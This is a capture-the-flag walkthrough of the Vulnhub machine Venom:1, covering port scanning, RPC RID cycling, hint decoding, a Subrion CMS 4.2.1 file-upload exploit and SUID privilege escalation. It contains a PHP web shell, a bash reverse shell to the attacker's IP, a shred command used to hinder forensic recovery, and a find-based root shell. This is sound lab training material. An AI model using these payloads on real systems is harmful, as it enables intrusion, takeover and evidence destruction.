
# Solving Vulnhub Machine Venom:1 (No Commentary) with Lofi Music [HERE](https://youtu.be/bPgMWwVcNtw)

Skills:
- Cracking Hashes
- RPC Enumeration
- FTP Enumeration
- RPC RID Cycling Attack (Manual brute force) + Xargs Boost Speed Tip - Discovering valid system users
- Crypto Challenge - Vigenere Cipher
- Subrion CMS v4.2.1 Exploitation - Arbitrary File Upload (Phar files) [RCE]
- Listing system files and discovering privileged information
- Abusing SUID binary (find) [Privilege Escalation]

The Walkthrough/Writeup

Let's perform a port scan with the NMAP tool, because as an attacker, your main goal is always to discover all open ports to find any vulnerabilities, enumerate services, and try to gain access to the system from there.

We'll use the `-p-` parameter to indicate that we want to scan the entire port range, keeping in mind that there are a total of 65535 ports. We'll scan only the open ports with `--open`. For the report, I want it to show only those ports that are open, as a port can be filtered, closed, or open. We'll use `-sS`, a scan mode that specifies that a SYN scan (also known as stealth SYN scan or semi-open scan) be performed. SYN scanning is a popular port scanning technique because it is more stealthy than other port scanning techniques and is less likely to be detected by firewalls or intrusion detection systems.

I recommend using `--min-rate 5000` to indicate that you want to process packets no slower than 5000 packets per second. We'll use a triple verbose `-vvv` to report the discovered ports as it progresses so that we can work ahead from another terminal.

Since we don't want DNS resolution to slow down the scan, we'll use the `-n` parameter. Finally, we'll use the `-Pn` parameter to indicate that we won't perform host detection via ping and that we'll attempt to scan the ports of all specified hosts regardless of whether they respond to pings or not. I configure it this way because we're in a controlled environment and want to quickly exploit it.

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ipvictim
```

Now that we know which ports are open, we'll perform an exhaustive scan using a set of basic NMAP recognition scripts.

`-sC`: This option runs a series of predefined Nmap scripts to identify services and possible vulnerabilities. 

`-sV`: This option is used to detect the versions of services that are running on open ports.

They can be combined into one using `-sCV`.

```
nmap -sCV -p21,80,139,443,445 ipvictim
```

We check the active services on each port and see that port 443 has HTTP. We can try to enumerate certificate information by connecting to the victim machine's IP via port 443 as a client using OpenSSL:

```
openssl s_client -connect ipvictim:443
```

We see nothing interesting, just a "wrong version number".

We continue checking the other ports and see that port 21 is open with FTP service. NMAP hasn't reported anything on this service, but remember that with `-sCV`, NMAP launches a set of basic recognition scripts, including `ftp-anon`, which detects if the "anonymous" user is enabled so that you can connect to the FTP service without providing a password. If NMAP didn't report it,

 it's likely that the "anonymous" user is not enabled. We can still check it ourselves:

```
ftp ipvictim
```

Enter "anonymous" as the user, and as we can see, it says "Permission denied". So it's indeed disabled.

Let's check port 80, which has an HTTP service, so let's open it in the browser to see what it shows.

There doesn't seem to be anything unusual, but if you look at the end of the site, it says "Follow this to get access on somewhere...". That's strange, so let's view the page source.

And indeed, there's a hash at the end. It seems to be an MD5 hash, so we can use Hash-Identifier to identify what we're facing.

I think we can crack this either locally or using the online tool crackstation.net. 

Since Crackstation gives good results, let's save it in a file to use later.

We noticed that Samba is enabled on port 139, so we can use smbmap to try to see the existing network shares on this machine:

```
smbmap -H victim-ip
```

We found the shared resource `print$` and `IPC`, but they give us NO ACCESS. We would need valid credentials to access these resources. We have a previously cracked password, but we still need the username.




Let's use `rpcclient` and a null session to see if we can connect to the machine to enumerate the system:

```
rpcclient -U "" victim-ip -N
```

We're in! Let's try `srvinfo` to see information about the server. 
Since we have a credential (the previously cracked password), we need to search for users. To do this, we'll run:

```
rpcclient -U "" victim-ip -N -c "help" | grep sid
```

This will help us enumerate possible users in the system. Now, we can use `lsaenumsid` as a command:

```
rpcclient -U "" victim-ip -N -c "lsaenumsid"
```

We have a result, so now we can run:

```
rpcclient -U "" victim-ip -N -c "lookupsids S-1-5-32-550
```

This corresponds to BUILTIN\Print Operators. We can use `xargs` to review each result of `lsaenumsid`:

```
seq 1 1000 | xargs -P 50 -I {} rpcclient -U "" victim-ip -N -c "lookupsids S-1-5-32-{}" | grep -v "unknown"
```
This result shows us groups, but we want to find users. So, if we change the parameter we used before (`lookupsids`) to `lookupnames root` (we use `root` because we know that this user exists in Linux)

```
rpcclient -U "" victim-ip -N -c "lookupnames root"
```
This gives us a result, and now it reports another SID. Previously, it had reported `S-1-5-32-550` and now it reports `S-1-22-1-0`. We have a new SID to search for users, so let's use `xargs` again:

```
seq 1 1500 | xargs -P 50 -I {} rpcclient -U "" victim-ip -N -c "lookupsids S-1-22-1-{}" | grep -oP '.*User\\[a-z].*\s'
```
And now we have the users: `nathan` and `hostinger`!!! We could have done this automatically with `enum4linux`, but we always want to have control over everything that's happening.

Now let's try to connect via FTP using the credentials we have (the cracked password and the two users):

As we see, it only let us connect with the user `hostinger` and password `hostinger`.

Let's check what directories and files exist on the system using `dir`. We see a directory called `files`, so we navigate to it with `cd files`. In there, we see a file called `hint.txt`, which we download using `get hint.txt`. We open it on our machine to see its contents.

The file gives us some instructions. We see that there are some base64-encoded strings and it gives us a username: `dora`. It also tells us to try `venom.box`, which might indicate that virtual hosting is being applied to the system. It also gives us an administrator password.

Let's decode the first Base64 encryption:

```
echo "WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=" | base64 -d; echo
```
This gives us another Base64 encryption, so we do the same to decode

 it and get another string. Let's do this to correctly decipher it:

```
echo "WXpOU2FHSnRVbWhqYlZGblpHMXNibHBYTld4amJWVm5XVEpzZDJGSFZuaz0=" | base64 -d | base64 -d | base64 -d; echo
```

Now we finally have a result in text. Vigenere is another type of encryption that requires a key to decipher it. We can try to decipher it using the CyberChef website and selecting the Vigenere option.

We enter the password we saw earlier in the `hint.txt` file in the input field and we need the key to decipher it, which we can find in the other Base64 encryption in the `hint.txt` file. Let's try to decipher it:

```
echo "aHR0cHM6Ly9jcnlwdGlpLmNvbS9waXBlcy92aWdlbmVyZS1jaXBoZXI=" | base64 -d; echo
```
This gives us a web address, which is another website where we can decipher the Vigenere encryption. We still don't have the key, so let's try using the `hostinger` password of the `hostinger` user as the key

And try it with the input and output in the virtual hosting `venom.box` that we saw in the `hint.txt` file.

If we do a `ping -c 1 venom.box` command, we see that it doesn't resolve anything. So let's open the `/etc/hosts` file with your preferred editor and put the victim's IP and `venom.box` so that when we call `venom.box`, it refers to the victim's IP.

Now if we run `ping -c 1 venom.box` again, we see that it gives us a connection. Let's open it in the browser to see what it is about:

We use `whatweb` to enumerate the services that `venom.box` has:

```
whatweb http://venom.box
```
We see `Subrion 4.2`, which is an open-source content management system that has an authentication panel. The `hint.txt` file mentions the `dora` user, so let's try logging in with the `dora` username and the output that CyberChef gave us. We are able to log in as an administrator.

If we enter the administration panel, we can see that the Subrion CMS version is `4.2.1`, so let's search for vulnerabilities associated with this version:

```
searchsploit subrion v 4.2.1
```
We find an arbitrary file upload. If we analyze the code of the `49876.py` exploit, we can get an idea of how to proceed, we can download the file to our folder as follows:

```
searchsploit -m php/webapps/49876.py
```
We see that the type of file that the exploit uploads is a file with a `.phar` extension. We also see that the directory to which the file is uploaded is `/uploads`.

We are going to create our `pwned.phar` file using PHP:

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Let's try to upload our file to `http://venom.box/panel/uploads/`.

Now we open our file and try to gain access to the system. We listen on port `443` on our machine:

```
nc -nlvp 443
```

And we

 execute a command from the URL that will send the interactive console:

```
venom.box/uploads/pwned.phar?cmd=bash -c "bash -i >& /dev/tcp/ourIP/443 0>&1"
```

Now we have access to the machine!

We apply a tty treatment:

```
script /dev/null -c bash (press enter)
Ctrl + Z (press enter)
stty raw -echo; fg (press enter)
reset xterm (press enter)
export TERM=xterm (press enter)
export SHELL=/bin/bash (press enter)
stty rows 61 columns 186 (press enter)
```

And voila, we have the console ready to operate. If we do an `ls -la` in the terminal we see several files, including our `pwned.phar`. We can delete it with:

```
shred -zun 10 -v pwned.phar
```

This way we make sure to properly delete our file and it will be harder to recover it with forensic techniques.

Now we go to the home directory with `cd /home`, we see two users, we switch to the `hostinger` user with `su hostinger`, we put in the password `hostinger` and look at the hidden files with `cd` and next `ls -la`. We see a `.bash_history` so let's check what it contains.

We see that a `cat` of  `/var/www/html/subrion/backup/.htaccess`. 

We go to that directory to see what we find with `cd /var/www/html/subrion/backup/`, we do an `ls -la` and see the `.htaccess` file. In principle, this file shouldn't be a problem, we do a `cat .htaccess` and see something interesting.

That could be the password of the other user, so we try to log in with that user. With `su nathan` we put in the password and effectively start a session.

We do `cd` and then `ls` and see what files this user has. We see a `user.txt`, we open it with `cat user.txt` and see the contents.

Now let's enumerate SUID permissions, but first do `cd /` and now:

```
find -perm -4000 2>/dev/null
```

We look for what we can exploit and see that the `find` binary is SUID which is strange to have that privilege. If we can take advantage of some `find` parameter that allows us to inject a command, that command will be executed as root.

We look on the website `gtfobins.github.io` to see what we can do with `find`. With `find` there's a way to get a shell:

```
find . -exec /bin/sh -p \; -quit
```

If we do `whoami` we see that we are already as root in the system. Now if we do `bash -p` we are as root in the bash and if we go to the root directory with `cd /root` and do `ls` we see the `root.txt` file and open it with `cat root.txt` and we can see the flag. This means we have successfully compromised the machine!
